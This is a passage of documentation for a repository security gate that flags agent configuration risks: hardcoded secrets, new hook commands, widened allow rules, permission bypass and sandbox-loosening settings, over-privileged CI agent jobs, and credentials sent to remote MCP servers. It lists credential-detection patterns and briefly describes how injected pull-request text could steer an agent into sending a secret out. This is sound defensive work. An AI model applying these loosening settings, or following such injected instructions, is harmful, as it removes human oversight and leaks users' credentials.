**Why this matters:** a hardcoded secret in a repository an agent (or
any collaborator) can read is one of the most common and most costly
real-world security failures — leaked into version control history,
copy-pasted into a log, or picked up by an agent as ordinary file
content. Catching it before it ships is far cheaper than rotating it
after it leaks.

**Example:** a config file commits `AWS_SECRET_KEY = "AKIA...`" as a
literal value. The scan reports `SECRET-CREDENTIAL-SHAPE-DETECTED` at
`high` confidence, naming the file location and pattern (AWS access key
shape) — never the key value itself, in output, logs, or the finding.

**Remediation:** rotate the exposed credential immediately (assume it is
compromised the moment it is committed), remove it from the file, and
replace it with a reference to a real secret-management system
(environment variable injected at runtime, a secrets manager, a vault).
Removing the literal from the current file is not sufficient by itself
if the credential was ever pushed — it must also be rotated.

**False positives:** confidence is deliberately downgraded, not
suppressed, for a file path that looks like a test/fixture location or
a value matching a well-known documented example (AWS's own published
example key, Stripe's `sk_test_` prefix, a run of repeated or
sequential characters) — these still surface, at lower confidence,
rather than being silently dropped, since a real secret sometimes does
end up in a test fixture by mistake. A genuinely high-entropy but
non-secret value (a hash, a UUID, a compiled asset) can trigger the
entropy heuristic; the required credential-suggestive keyword on the
same line (`secret`, `token`, `password`, `api_key`, `credential`,
`auth`) is what keeps this narrow, but is not a perfect filter.

This rule was blocked on two real architectural gaps, both now
resolved:

1. **`Finding` attribution.** The `Finding` model originally
   required exactly one `affected_agent` and a real `capability_path`.
   Hardcoded secret material discovered via generic repository-content
   scanning has no natural single-agent attribution -- a secret in a
   shared config file may be reachable by zero, one, or many agents.
   **Resolved**: `Finding.affected_agent`/`capability_path` are now
   optional together (schema `1.1.0`) -- see [Finding
   model](finding-model.md#affected_agentcapability_path-are-optional-schema-110).
   This rule's own `findings()` always constructs a repository-scoped
   `Finding` (both `None`).
2. **Where content scanning happens.** The rule engine structurally
   forbids a `Rule.evaluate` from touching the filesystem, but this
   rule needs raw file content scanned for secret-shaped strings and
   high-entropy values. **Resolved with a significant, disclosed
   architectural choice:** `controlloop.secret_scan.
   scan_repository_for_secrets` is a new, directly-invoked, bounded
   discovery pass -- not a `DiscoveryAdapter` (that Protocol's shared
   conformance suite is built for one-structured-document-format
   adapters with a version marker, a poor fit for a whole-repository
   content scanner; see that module's own docstring) -- wired into
   `controlloop.bom.build_acbom_document` alongside `walk_repository`
   and `run_adapters`. It reads only files `walk_repository` itself
   already yielded and produces `Diagnostic`s (`SECRET-CREDENTIAL-SHAPE-
   DETECTED`, `SECRET-HIGH-ENTROPY-VALUE-DETECTED`) on
   `ACBOMDocument.diagnostics` -- a pattern/heuristic name, a location,
   and a confidence, **never the matched value**. This rule's `evaluate`/
   `findings` read only those two diagnostic codes back out of
   `context.acbom.diagnostics`, exactly what a `Rule` is allowed to read.

### Detection shapes and confidence

- **Known credential shapes** (`SECRET-CREDENTIAL-SHAPE-DETECTED`, `high`
  confidence baseline): reuses `controlloop.redaction`'s existing
  signature-based pattern set (AWS access key ID, GitHub token, GitHub
  fine-grained token, Slack token, Google API key, Stripe secret key, a
  PEM private-key block, a JSON Web Token, an Anthropic API or Admin API
  key, an OpenAI API key, a legacy OpenAI API key) via a new, narrowly-scoped
  `controlloop.redaction.scan_credential_shapes` function that returns a
  shape name and character offsets only, never the matched substring --
  reused rather than duplicated, per this codebase's "one redaction
  module knows what a secret looks like" discipline.
- **High-entropy values** (`SECRET-HIGH-ENTROPY-VALUE-DETECTED`, `medium`
  confidence baseline, one tier below a known-shape match, disclosed as
  genuinely less certain): requires both a credential-suggestive
  assignment context on the same line (a keyword such as `secret`,
  `token`, `password`, `api_key`, `credential`, or `auth` immediately
  followed by `=`/`:`) and a candidate value of at least 20 base64/hex/
  URL-safe characters whose Shannon entropy is at or above 4.0
  bits/character -- a widely used practical threshold, never claimed as
  a proven statistical guarantee.
- **Test fixtures and documented example values**: confidence is
  downgraded one tier -- never treated as certain -- when the file's own
  path looks like a test/fixture location (a segment such as `tests`,
  `fixtures`, `examples`, `samples`, `mocks`, `specs`, or `demos`), or
  the matched value itself is a documented, well-known placeholder
  (AWS's own published documentation example key, Stripe's own
  documented `sk_test_` prefix, a small set of generic filler markers, a
  run of four or more identical characters, or a four-or-more-digit
  ascending/descending run). A known-shape match downgraded this way
  lands at `medium`; an entropy match downgraded this way lands at
  `low`. Neither ever reaches `high`, and neither is ever silently
  dropped.

`findings()` maps each detection's confidence to a severity, this rule's
own disclosed judgment call: `high` confidence -> `critical` severity,
`medium` -> `high`, `low` -> `medium`. `change_state` is always
`not-compared` -- this rule has no node to look up in a baseline diff at
all (repository-scoped by design above), so the lookup every other rule
uses (`node_change_state`) is structurally unavailable here.

<a id="unsanctioned-agent-component"></a>
## Unsanctioned agent component

**Availability:** a Team rule. It is loaded only on a `controlloop gate`
run with Team enabled and an effective organization policy; `scan` and a
Community `gate` never load it and make no network call on its account.

**Outcome:** every grant a change adds or changes (the
[authority statement](authority-statement.md)'s entries) is judged
against the organization's effective approved-components list, after the
strengthen-only merge with the repository's own list. One finding per
grant the list does not cover, naming the grant, the constraint that
failed, and the organization policy version that judged it.

**Why this matters:** an organization decides which hooks, servers,
plugins, skills, and permission patterns its agents may use. A grant
nobody approved is the change a review exists to catch, and the gate
should say so before merge rather than the platform after.

**How a grant is judged:** exactly as the platform flags a component.
An entry matches when its `type` is the grant's component type and its
`name_pattern` matches the grant's name (a hook's event, a server's name,
a plugin's name); every constraint it carries must then hold (see
[Approved-component
constraints](policy-merge-semantics.md#approved-component-constraints)):

| Constraint | Failed constraint reported |
| --- | --- |
| no entry has the grant's type and name | `name` |
| `package` | `package` |
| `version_range` | `version_range` |
| `digest` | `digest` |
| `command_pattern` (hooks) | `command_pattern` |
| `pin_required` | `pin_required` |

A constraint the grant cannot be shown to meet is not met: a missing
version is inside no range, and an unknown pin is not a pin. The judgment
is held to the platform's contract vectors (the CLI's copies are
`tests/fixtures/contract/version_range_vectors.json`,
`flagging_vectors.json`, and `policy_merge_vectors.json`).

**Severity and verdict:** `medium`, which the gate turns
into **Review required** (exit `3`) by default. An organization makes it
fail instead with a `severity_floor` of `high` or `critical` for this
rule in its bundle (**Deployment blocked**, exit `1`). The CLI does not
decide which.

**Example:** a pull request adds MCP server `docs`, launching
`@acme/docs-mcp@1.4.2`, and the organization's bundle version 7 approves
`docs` only for `version_range: 2.x`. Real output, recorded on
2026-10-17:

```text
! REVIEW REQUIRED

Authority:
  • This change gives Claude Code the power to start MCP server `docs` by
    running `npx -y @acme/docs-mcp@1.4.2 ./docs` (`.mcp.json`, server `docs`).
    No approval is recorded.

! MEDIUM   policy.unsanctioned-agent-component: The mcp_server `docs` is not
  approved by organization policy version 7: its version is not inside the
  approved range (constraint `version_range`).
    at .mcp.json
```

The evidence artifact records the judgment:

```json
{
  "component_type": "mcp_server",
  "component_name": "docs",
  "state": "unsanctioned",
  "failed_constraint": "version_range",
  "judged_by_policy_version": "7"
}
```

**No published bundle is `unevaluated`, never a pass.** An organization
that has never published a bundle gets no finding from this rule, and
the evidence artifact's `team.sanction_note` says so: "unevaluated: no
published organization policy bundle governs this project, so no
agent-authority grant was judged against an approved list. This is not an
approval." Each judgment's `state` is `unevaluated`. A published bundle
with an empty approved list is a decision that nothing is approved, and
every grant is unsanctioned.

**Change states and confidence:** `added` or `changed`; a removed grant
is not judged. Confidence is the grant's own.

**Approving or suppressing:** a repository's `controlloop.yaml` approval
does **not** clear this finding; only the organization decides what it
approves. Ask an admin to approve the grant (Policies -> Review queue),
or let a reviewed grant through with an organization exception, which
matches the finding's `id` and re-blocks visibly when it expires.

**Remediation:** have the grant approved and the bundle published, change
it to match an approved entry, or remove it.

**False positives:** a name that matches but a constraint the scanner
could not read (a server launched with no recorded version, a plugin
whose pin is resolved outside the repository) is unsanctioned by design.
Approve it by pattern without that constraint if that is what the
organization intends.

## Known limitations specific to this rule

- Each detection's finding identity includes its credential kind and
  its ordinal among detections of that kind in the file, never a line
  number. Adding a secret of the same kind above an existing one in the
  same file gives the existing one a new identity, so a suppression
  naming it reports `stale` -- see [Finding
  model](finding-model.md#finding-identity).
- The high-entropy heuristic's false-positive/false-negative rate is not
  eliminated by design -- the goal is *documented* confidence, not
  perfect precision; see `controlloop.secret_scan`'s own module
  docstring for the full disclosed reasoning.
- `controlloop.secret_scan.SecretScanBounds.max_detections` (default
  200) is a generous, disclosed starting point, not a tuned production
  threshold.
- Decoding or decrypting obfuscated values, and any machine-learned
  classifier, are both explicit non-goals.

## Disclosed limitation shared by several rules in this package

`change_state` is derived from `RuleContext.diff` via
`controlloop.policy.rules._shared.node_change_state` for missing action
logging, unauthorized delegation, unresolved dynamic tool registration,
and capability ceiling evaluation.
`controlloop.diff.models.DiffResult` structurally never represents an
*unchanged* identity, and `FindingChangeState` has no "unchanged"
member -- only `added`, `removed`, `changed`, `unknown`, and
`not-compared`. When a diff is supplied but the specific node a finding
concerns is absent from `diff.node_changes` (genuinely unchanged), this
falls back to `not-compared` rather than inventing an unapproved sixth
member. This is a disclosed gap between two independently designed
contracts (`DiffResult` and `FindingChangeState`), not something any one
rule can fix.

The seven agent-authority rules below are change-only and read only
committed files; [the unsanctioned agent component rule](#unsanctioned-agent-component)
applies an organization's approved list to the same grants on a Team gate. For what they cannot see, read
[what a passing gate does not guarantee](agent-authority-limits.md).

<a id="agent-hook-command-change"></a>
## Agent hook command change

**Outcome:** a hook or helper command that is added, or whose command
changes, in any agent host's committed configuration is reported with
the file, the key path, the event, and the command it runs.

**Why this matters:** a committed `SessionStart` hook runs on every
machine that opens the repository. The Miasma worm, Mini Shai-Hulud,
and CVE-2026-25725 all spread that way. A formatter hook and a
credential harvester are both hook changes, so the finding carries the
command for a reviewer to read.

**Example:** a pull request adds a `SessionStart` hook to
`.claude/settings.json` running `node .github/setup.js`. The finding
reads "Added: Hook on event 'SessionStart' for host 'Claude Code' runs
`node .github/setup.js`." at `high`.

| Change state | Severity |
| --- | --- |
| Command hook or helper command added or changed | `high` |
| `http`, `mcp_tool`, `prompt`, or `agent` hook added or changed | `medium` |
| Removed | `info` |
| No baseline (first scan) | `low` |
| Unchanged, or moved to another event with the same command | none |

Confidence is `high` when the command is recorded whole, `medium` when
it was cut at the 512-character bound.

A skill's shell lines and a plugin's `bin/` directory are reported by
[component shell execution](#component-shell-execution), not here
(this rule reported them before version 1.1.0).

**Change states and confidence:** `added` or `changed` (command `high`, other hook types `medium`), `removed` (`info`), and `not-compared` on a scan with no baseline (`low`). A hook removed and re-added on another event with the same command is a move and is silent. Confidence is `high`, or `medium` when the command was cut at the recording bound.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** read the command and confirm every developer and CI run
should execute it, or remove it.

**False positives:** every new hook is reported, including a formatter.
That is deliberate: the rule reports the change, and a reviewed hook is
approved once, by fingerprint ([suppressions](suppressions.md)).

<a id="widened-permission-rule"></a>
## Widened permission rule

**Outcome:** an allow rule held by an agent host or an agent workflow
that is added as a wildcard, added as a superset of a baseline rule, or
changed to cover its old pattern is reported.

**Why this matters:** an allow rule runs what it matches without asking.
Replacing `Bash(npm test)` with `Bash(*)` reads as a one-line change and
hands the agent every shell command.

**Example:** `.claude/settings.json` changes `"Bash(npm test)"` to
`"Bash(*)"`. The finding reads "Allow rule for 'Claude Code' widened
from 'Bash(npm test)' to 'Bash(*)'." at `high`.

| Change | Severity |
| --- | --- |
| Wildcard rule added; rule added that covers a baseline rule; rule changed to cover its old pattern | `high` |
| The same, for a read-only tool (`Read`, `Grep`, `Glob`, `LS`, `NotebookRead`, Gemini CLI `read_file`, `read_many_files`, `glob`, `search_file_content`, `list_directory`) | `medium` |
| No baseline (first scan), wildcard rules | `low` |
| Narrowed, removed, a new `deny` or `ask`, or an identical rule moved between files | none |

Wildcards are a bare tool name, `Tool(*)`, any `*` in a shell rule
(including `:*`), `mcp__server`, `mcp__server__*`, and tool-name globs.
A shell rule stays `high` however narrow its prefix: `Bash(npm run:*)`
runs any script in a file the same pull request can edit.

**Change states and confidence:** `added` or `changed` (`high`, or `medium` for a read-only tool), and `not-compared` for wildcard rules on a scan with no baseline (`low`). Confidence is `high`: the rule text is read, never inferred.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** narrow the rule to the commands or tools the agent
needs.

Roo Code `.roomodes` tool groups are allow rules the Roo Code host holds
(see [Roo Code](../adapters/roo.md)): a mode that gains `command`,
`browser`, or `mcp`, or an `edit` group that loses its `fileRegex`, is
reported here.

**False positives:** a skill's or subagent's own grants are reported by
[component self-grant](#component-self-grant), not here.

<a id="permission-bypass-from-project"></a>
## Permission bypass from project files

**Outcome:** a project file that moves an agent host's permission or
approval mode toward fewer confirmations, turns off a protection, or
auto-approves an MCP tool is reported. Moving the other way is silent.

**Why this matters:** these settings decide how much an agent may do
without asking, for everyone who opens the repository, whether or not a
given host version honors them from a project file.

**Example:** `.codex/config.toml` changes `approval_policy = "on-request"`
to `"never"`. The finding reads "Codex: 'approval_policy' moved from
'on-request' to 'never'." at `high`.

| Setting | Order, strictest first |
| --- | --- |
| Claude Code `permissions.defaultMode` | `plan`, `default` (= `manual`, and the value when unset), `acceptEdits`, `dontAsk`, `auto`, `bypassPermissions` |
| Codex `approval_policy` | `untrusted`, `on-request`, `on-failure`, `never` |
| Codex `sandbox_mode` | `read-only`, `workspace-write`, `danger-full-access` |
| Codex `default_permissions` | `:read-only`, `:workspace`, `:danger-full-access` |
| Gemini CLI `general.defaultApprovalMode` | `plan`, `default`, `auto_edit`, `yolo` |
| A subagent's `permissionMode` | the Claude Code order, short of `bypassPermissions` (reported by [component self-grant](#component-self-grant)) |

Also reported: Claude Code `disableAllHooks` or `disableSkillShellExecution`
going from `true` to anything else, and
`disableBypassPermissionsMode` being removed; and a tool added to a Kiro
`autoApprove`, Roo `alwaysAllow`, or Cline `autoApprove` list, or a
Gemini CLI server given `trust: true`.

| Change state | Severity |
| --- | --- |
| Loosened | `high` |
| No baseline (first scan): a host at the loose end of a scale, or an auto-approval | `low` |
| Tightened or unchanged | none |

Sandbox and network egress settings, including Claude Code's
`sandbox.enabled` (read by this rule before version 1.1.0), are reported
by [agent sandbox weakened](#agent-sandbox-weakened).

**Change states and confidence:** `changed`, or `added` when a host first appears with a loose setting (`high`); `not-compared` on a scan with no baseline for a host in a bypass mode and for each auto-approval (`low`). Confidence is `high`.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** keep the stricter mode in the project file and set
looser modes in personal settings outside the repository.

**False positives:** a project file that sets `bypassPermissions` is
reported even though Claude Code has ignored it from project files since
v2.1.257, because older versions still honor it.

<a id="unpinned-agent-component"></a>
## Unpinned agent component

**Outcome:** a Claude Code plugin or marketplace that is added, or whose
pin or source changes, is reported with its source type and whether it
is pinned.

**Why this matters:** a plugin runs with the user's privileges and can
put executables on the agent's `PATH`. Without a commit or digest pin,
what it does can change upstream with no change in your repository.

**Example:** a pull request adds `"extraKnownMarketplaces": {"team":
{"source": {"source": "github", "repo": "acme/plugins"}}}` to
`.claude/settings.json`. The finding reads "Added: Marketplace team
(github) has no commit or digest pin." at `medium`.

| Change state | Severity |
| --- | --- |
| Added, unpinned or pin unknown | `medium` |
| Added, pinned | `low` |
| Pin, source, or location changed | `medium` |
| No baseline (first scan) | `low` |
| Removed, or unchanged since the baseline | none |

Confidence is `high` when the pin status is known, `medium` when the pin
is resolved outside the repository (a plugin enabled from a marketplace
the repository does not declare).

**Change states and confidence:** `added` (`medium` unpinned, `low` pinned), `changed` to unpinned (`medium`), and `not-compared` on a scan with no baseline (`low`). Confidence is `high` when the pin state is known and `medium` when the source is resolved outside the repository.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** pin the component to a full commit SHA (`sha`, or a
40-character `ref`) or a SHA-256 digest (`sha256`).

**False positives:** a branch or tag `ref` is treated as unpinned
because it can move. A plugin enabled by name has an unknown pin, since
its source lives in the marketplace. Suppress a reviewed finding by its
fingerprint ([suppressions](suppressions.md)).

<a id="mcp-server-identity-change"></a>
## MCP server identity change

**Outcome:** an MCP server whose name stayed the same while its package,
version, command, arguments, or declaration changed is reported, naming
every field that changed.

**Why this matters:** the postmark-mcp backdoor shipped in version
1.0.16 after fifteen clean releases, and the configuration that
installed it named the same server every time. A rename is visible; a
same-name swap is not, unless something compares identity.

**Example:** `.mcp.json` changes `"args": ["-y", "postmark-mcp@1.0.15"]`
to `"args": ["-y", "postmark-mcp@1.0.16"]`. The finding reads "Server
'postmark' kept its name but its identity changed: package version from
'1.0.15' to '1.0.16', args from ... to ..., declaration digest." at
`high`.

| Change | Severity |
| --- | --- |
| Command, package, version, or registry changed | `high` |
| Arguments, transport, remote host, env or header names, declaration digest, or tool digest changed | `medium` |
| New server | `medium` |
| No baseline (first scan) | none |

**Change states and confidence:** `changed` (`high` when the package, version, command, or URL host changes under the same name; `medium` for other declaration or tool-list changes) and `added` (`medium` for a new pinned server). A first scan reports nothing: there is no earlier identity to compare. Confidence is `high`.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** confirm the new package or command is the one you
intend and pin it to an exact version or digest, or revert the change.

**False positives:** a deliberate upgrade of the same package reports
`high` because the version changed; that is the case the rule exists
for, and a reviewed upgrade is suppressed by fingerprint.

<a id="overprivileged-agent-workflow"></a>
## Over-privileged agent workflow

**Outcome:** a GitHub workflow job that runs a coding agent is reported
when the agent holds a write token (`contents`, `pull-requests`, or
`id-token`) and skips its permission prompts, or runs on an untrusted
trigger with no explicit `permissions` block.

**Why this matters:** a workflow decides what an agent can do with no
one watching. Write tokens plus skipped prompts let an injected
instruction push code or mint cloud credentials.

**Example:** a job runs `anthropics/claude-code-action@v1` with
`claude_args: --dangerously-skip-permissions` under `permissions:
{contents: write, id-token: write}`. The finding reads "Job 'claude /
review' holds contents: write, id-token: write and skips permission
prompts." at `high`.

| Change state | Severity |
| --- | --- |
| Added, or changed into this condition | `high` |
| No baseline (first scan) | `medium` |
| Already over-privileged in the baseline, or removed | none |

Confidence is `high` for an explicit write token with skipped prompts,
`medium` for an untrusted trigger relying on the default token.

**Change states and confidence:** `added`, or `changed` into the over-privileged state (`high`); `not-compared` on a scan with no baseline (`medium`). A runtime that was already over-privileged in the baseline is silent. Confidence is `high` for a write token with a skip flag and `medium` for an untrusted trigger with the repository's default token.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** give the job an explicit `permissions` block with the
narrowest scopes it needs, remove the skip-permissions flag, and avoid
running an agent with write access on untrusted triggers.

**False positives:** a read-only job is never reported, whatever its
flags. A job whose permissions are an expression is reported as an
unknown by the adapter, not by this rule.

<a id="component-self-grant"></a>
## Component self-grant

**Outcome:** a skill whose `allowed-tools`, or a subagent whose `tools`,
grants a tool the agent host's allow set does not cover, or a subagent
running in `bypassPermissions`, is reported.

**Why this matters:** a skill's `allowed-tools` is not gated by
workspace trust, so a committed skill can hand Claude Code a tool the
repository's own `permissions.allow` never granted.

**Example:** `.claude/settings.json` allows `Bash(npm *)`, and a skill
adds `allowed-tools: Bash(kubectl *)`. The finding reads "Skill deploy
allows 'Bash(kubectl *)', which the host's allow set does not grant." at
`medium`.

The host's allow set is its `permissions.allow` rules, plus `Read`,
`Grep`, `Glob`, `LS`, `NotebookRead`, and `TodoWrite` (which every
permission mode runs without asking), plus `Edit`, `MultiEdit`, `Write`,
and `NotebookEdit` when the host's mode is `acceptEdits` or looser. A
grant is covered by an identical rule, a bare-tool or `Tool(*)` rule for
the same tool, or a prefix wildcard such as `Bash(npm *)` the grant
starts with. A host in `bypassPermissions` covers everything.

| Change state | Severity |
| --- | --- |
| Grant added or changed | `medium` |
| Subagent moved into `bypassPermissions` | `high` |
| No baseline (first scan) | `low` |
| Removed, or unchanged since the baseline | none |

**Change states and confidence:** `added` or `changed` (`high` for a subagent moved into `bypassPermissions`, `medium` for a grant beyond what the host allows), and `not-compared` on a scan with no baseline (`low`). Confidence is `high`.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** narrow the grant to what the host allows, add the rule
to the host's `permissions.allow` if the whole agent should have it.

**False positives:** a subagent's `tools` list restricts which tools it
can see as well as granting them; listing a tool the host does not allow
is reported even when the intent was only to restrict. Suppress a
reviewed finding by its fingerprint.

[Hardcoded secret material](#hardcoded-secrets) also covers agent
configuration: `.claude/`, `.mcp.json`,
`.cursor/`, `.codex/`, `.gemini/`, `.kiro/`, `.roo/`, `.continue/`,
`.windsurf/`, `.claude-plugin/`, `.vscode/mcp.json`,
`cline_mcp_settings.json`, and `opencode.json` are never treated as test
or example locations, and a quoted key such as `"MAIL_API_KEY": "..."` in
an MCP `env` or `headers` block is matched. The value is never emitted.
Unlike the agent-authority rules, this one is not change-only: a
committed secret is exposed whether or not the current change added it,
so it is reported on every scan, at the severity and confidence above.
Rotate the credential first; a suppression for it should name the
finding's `id` and expire soon.

<a id="agent-sandbox-weakened"></a>
## Agent sandbox weakened

**Outcome:** a change that turns off a coding agent's sandbox, lets its
commands run outside the sandbox, approves every command because a
sandbox exists, or opens its network egress is reported, the way a move
to `bypassPermissions` already is.

**Why this matters:** the sandbox is what keeps an agent's shell commands
away from the rest of the machine and the network, and the [limits
page](agent-authority-limits.md) recommends pairing a passing gate with
sandboxed or network-restricted runs. A project file that loosens it
does so for everyone who opens the repository.

**Example:** `.claude/settings.json` changes `"sandbox": {"enabled":
true}` to `false`. The finding reads "Claude Code: 'sandbox.enabled'
moved from 'true' to 'false'." at `high`.

| Setting | Order, tightest first |
| --- | --- |
| Claude Code `sandbox.enabled` | `true`, `false` |
| Claude Code `sandbox.allowUnsandboxedCommands` | `false`, `true` |
| Claude Code `sandbox.autoAllowBashIfSandboxed` | `false`, `true` |
| Codex `sandbox_workspace_write.network_access` | `false`, `true` |
| Gemini CLI `tools.sandbox` | on (`true` or a sandbox command such as `docker`), `false` |
| Gemini CLI `tools.sandboxNetworkAccess` | `false`, `true` |
| Cursor `egressMode` (`.cursor/environment.json`) | `network_settings_only`, `default_with_network_settings`, `parent_plus_network_settings`, `allow_all` |

A move toward the loose end is a loosening. So is removing a setting
that was tighter than the loose end, since the protection is gone, and
setting one to the loose end where the project file had not set it. A
value this rule does not know is not reported. Every loosened setting on
one host is one finding.

| Change state | Severity |
| --- | --- |
| Loosened | `high` |
| No baseline (first scan): a setting already at the loose end | `low` |
| Tightened or unchanged | none |

Approval modes and Codex `sandbox_mode` stay with [permission bypass from
project files](#permission-bypass-from-project); this rule takes the
remaining sandbox and egress settings, including Claude Code's
`sandbox.enabled`.

**Change states and confidence:** `changed`, or `added` when a host first appears with a loose setting (`high`); `not-compared` on a scan with no baseline (`low`). Confidence is `high`.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** keep the tight value in the project file, and set looser
values in personal settings outside the repository when one person needs
them. The finding's remediation names the tight value for each setting
the host has.

**False positives:** a host version that ignores a setting from a project
file is still reported, because other versions honor it. Cursor's
`egressMode` order comes from its environment schema's descriptions;
the documentation states none.

<a id="secret-exposed-to-untrusted-agent-run"></a>
## Secret exposed to an untrusted agent run

**Outcome:** a workflow job that runs a coding agent on untrusted input
and is given a repository secret is reported, naming the secrets and the
trigger.

**Why this matters:** this is the [exfiltration
triangle](#exfiltration-triangle) for CI agents. Whoever opens the pull
request or writes the comment can steer the agent (untrusted input), the
job holds the secret (sensitive data), and the agent can reach the
network. An injected instruction can read the secret and send it out.
It is a separate rule because the triangle reads agent, resource, and
tool nodes, and this reads one workflow job's recorded triggers and
secret names.

**Example:** a job on `pull_request_target` runs
`anthropics/claude-code-action@v1` with `env: DEPLOY_KEY: ${{
secrets.DEPLOY_KEY }}`. The finding reads "Job 'agent / review' runs an
agent on untrusted input (pull_request_target) and is given secret
DEPLOY_KEY." at `high`.

Untrusted input is a job triggered by `pull_request_target`,
`issue_comment`, `workflow_run`, `issues`,
`pull_request_review_comment`, or `discussion_comment`, or one that
checks out the pull request head. A secret is any `secrets.<NAME>` the
job's `env` or the agent step references, except `GITHUB_TOKEN`, whose
permissions are [over-privileged agent
workflow](#overprivileged-agent-workflow)'s. The agent's own API key
(`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`) counts: it can
still be read and sent out.

| Change state | Severity |
| --- | --- |
| Added, changed into this state, or given another secret | `high` |
| No baseline (first scan) | `medium` |
| Exposed secrets unchanged since the baseline, trigger or secrets removed | none |

**Change states and confidence:** `added` or `changed` (`high`, naming only the secrets the change newly exposes); `not-compared` on a scan with no baseline (`medium`). Confidence is `high`. Secret names are reported; values are never read.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** run the agent on `pull_request` from the base branch,
move the secret to a job the agent does not run in, or gate the job on an
environment that needs approval. If the secret is the agent's own API
key, scope it to this job and set a spend limit.

**False positives:** a job whose runner blocks outbound network access
is still reported; the rule does not read runner or firewall settings.
So is a `pull_request_target` job limited to collaborators by a job
condition, since the condition is not evaluated.

<a id="credentialed-remote-mcp-server"></a>
## Credentialed remote MCP server

**Outcome:** a new or changed HTTP or SSE MCP server whose declaration
sends a credential to a remote host is reported, naming the server, the
host, and the header or variable name.

**Why this matters:** a committed server declaration with an
`Authorization` header or a token variable sends that credential to the
server's host on every request the agent makes. A pull request that adds
such a server, adds a credential to one, or points one at a new host
decides where a credential goes. [MCP server identity
change](#mcp-server-identity-change) sees the same-name swap; this rule
says what the server carries.

**Example:** `.mcp.json` adds a server `docs` with `"url":
"https://api.example.com/mcp"` and an `Authorization` header. The finding
reads "MCP server 'docs' sends Authorization to api.example.com." at
`medium`. If a later change points `docs` at `collector.example.net`, the
finding reads "MCP server 'docs' now sends Authorization to
collector.example.net, previously api.example.com." at `high`.

A credential is recognized by its header or variable **name**, never its
value, which the adapter never reads. The names, compared
case-insensitively, are `authorization`, `proxy-authorization`,
`x-api-key`, `api-key`, and any name ending in `_token`, `_secret`,
`_key`, `_password`, `_credential`, or `_apikey`. A server's
`bearer_token_env_var` (Codex) joins its variable names.

| Change state | Severity |
| --- | --- |
| Credentialed server's host changed | `high` |
| Credentialed server added | `medium` |
| Credential name added to an existing server | `medium` |
| No baseline (first scan) | `low` |
| Removed, unchanged, or no credential-shaped name | none |

A stdio server never fires here, whatever its environment names: its
environment goes to a local process. There is no allowlist of trusted
hosts; approve a reviewed server instead.

**Change states and confidence:** `added` (`medium`) or `changed` (`high` for a new host, `medium` for a new credential name); `not-compared` on a scan with no baseline (`low`). Confidence is `high`.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too. A Team organization can also record an exception for the finding.

**Remediation:** keep the credential in the agent host's own secret store
rather than in the committed declaration's headers, pin the server, and
confirm the host is first party or one you trust with the credential.

**False positives:** a header or variable whose name matches the shape
